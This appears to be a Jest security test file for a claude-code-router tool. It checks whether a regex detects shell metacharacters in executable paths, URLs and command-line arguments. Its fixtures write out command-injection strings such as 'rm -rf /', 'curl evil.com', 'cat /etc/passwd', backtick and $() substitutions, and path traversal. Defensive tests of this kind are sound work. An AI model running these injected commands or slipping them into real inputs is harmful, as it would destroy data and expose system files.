/**
 * Security Tests - Command Injection
 * Tests for CRITICAL vulnerabilities #2 and #3: Command Injection
 */

describe('Security: Command Injection Prevention', () => {
  describe('CLAUDE_PATH Validation', () => {
    it('should detect command injection in CLAUDE_PATH', () => {
      const maliciousPaths = [
        'claude; rm -rf /',
        'claude && curl evil.com',
        'claude | cat /etc/passwd',
        'claude`whoami`',
        'claude$(whoami)',
      ];

      maliciousPaths.forEach(maliciousPath => {
        // Check for shell metacharacters
        const hasMetachars = /[;&|`$()]/.test(maliciousPath);
        expect(hasMetachars).toBe(true);
      });
    });

    it('should accept valid executable paths', () => {
      const validPaths = [
        '/usr/local/bin/claude',
        '/home/user/.npm/bin/claude',
        'claude',
        '/opt/claude/bin/claude',
      ];

      validPaths.forEach(validPath => {
        // Valid paths should not contain shell metacharacters
        const hasMetachars = /[;&|`$()]/.test(validPath);
        expect(hasMetachars).toBe(false);
      });
    });

    it('should reject paths with spaces and special chars', () => {
      const suspiciousPaths = [
        'claude --flag; malicious',
        '/usr/bin/claude && echo pwned',
      ];

      suspiciousPaths.forEach(suspiciousPath => {
        const hasShellInjection = /[;&|`$()]/.test(suspiciousPath);
        expect(hasShellInjection).toBe(true);
      });
    });
  });

  describe('URL Command Injection (UI Command)', () => {
    it('should detect command injection in URLs', () => {
      const maliciousUrls = [
        'http://evil.com; curl malware.com',
        'http://test.com && rm -rf /',
        'http://test.com | cat /etc/passwd',
        'http://test.com`whoami`',
      ];

      maliciousUrls.forEach(maliciousUrl => {
        const hasMetachars = /[;&|`$()]/.test(maliciousUrl);
        expect(hasMetachars).toBe(true);
      });
    });

    it('should accept valid URLs', () => {
      const validUrls = [
        'http://127.0.0.1:3456/ui/',
        'http://localhost:3456/ui/',
        'https://example.com/path?query=value',
      ];

      validUrls.forEach(validUrl => {
        // Valid URLs might contain some special chars, but not shell metacharacters
        const hasShellInjection = /[;&|`]/.test(validUrl);
        expect(hasShellInjection).toBe(false);
      });
    });
  });

  describe('NPM Command Injection', () => {
    it('should use hardcoded package names', () => {
      const packageName = '@musistudio/claude-code-router';

      // Package name should not contain shell metacharacters
      const hasMetachars = /[;&|`$()]/.test(packageName);
      expect(hasMetachars).toBe(false);

      // Package name should follow npm naming conventions
      const isValidNpmName = /^(@[a-z0-9-~][a-z0-9-._~]*\/)?[a-z0-9-~][a-z0-9-._~]*$/.test(packageName);
      expect(isValidNpmName).toBe(true);
    });
  });

  describe('Shell Option Security', () => {
    it('should identify spawn calls with shell:true as risky', () => {
      const riskySpawnOptions = {
        shell: true,  // DANGEROUS!
      };

      expect(riskySpawnOptions.shell).toBe(true);
    });

    it('should recommend spawn without shell option', () => {
      const safeSpawnOptions = {
        shell: false,
      };

      expect(safeSpawnOptions.shell).toBe(false);
    });
  });

  describe('Argument Injection Prevention', () => {
    it('should detect argument injection attempts', () => {
      const maliciousArgs = [
        '--flag; rm -rf /',
        '-x && curl evil.com',
        '--config=../../../etc/passwd',
      ];

      maliciousArgs.forEach(arg => {
        const hasInjection = /[;&|]/.test(arg);
        const hasPathTraversal = /\.\./.test(arg);
        const isSuspicious = hasInjection || hasPathTraversal;

        expect(isSuspicious).toBe(true);
      });
    });

    it('should accept valid arguments', () => {
      const validArgs = [
        '--verbose',
        '--config=myconfig.json',
        '-x',
        '--flag',
      ];

      validArgs.forEach(arg => {
        const hasInjection = /[;&|`$()]/.test(arg);
        expect(hasInjection).toBe(false);
      });
    });
  });
});
